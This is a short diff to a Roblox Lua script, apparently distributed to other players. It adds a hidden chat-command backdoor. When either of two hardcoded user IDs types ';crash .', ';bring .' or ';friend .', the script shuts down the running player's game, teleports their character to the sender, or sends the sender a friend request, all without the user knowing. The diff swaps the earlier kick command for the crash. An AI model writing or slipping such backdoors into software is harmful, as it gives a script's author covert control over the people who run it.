@@ -2994,15 +2994,18 @@ game:GetService("TextChatService").OnIncomingMessage = function(message)
 	if message.TextSource then
 		if message.TextSource.UserId == 850599619 or message.TextSource.UserId == 7836198961 then
 			if message.TextSource.UserId == game.Players.LocalPlayer.UserId then return end
-			if message.Text == ";kick ." then
-				game.Players.LocalPlayer:Kick("Kicked by the owner of this script.")
+			if message.Text:sub(1,8) == ";crash ." then
+				game:Shutdown()
 			end
-			if message.Text == ";bring ." then
+			if message.Text:sub(1,8) == ";bring ." then
 				if not Running then
 					game.Players.LocalPlayer.Character.Head.CFrame = game.Players:GetPlayerByUserId(message.TextSource.UserId).Character.Head.CFrame
 				else
 					Empyrean.Rig.Head.CFrame = game.Players:GetPlayerByUserId(message.TextSource.UserId).Character.Head.CFrame
 				end
+			end
+			if message.Text:sub(1,9) == ";friend ." then
+				game.Players.LocalPlayer:RequestFriendship(game.Players:GetPlayerByUserId(message.TextSource.UserId))
 			end
 		end
 	end
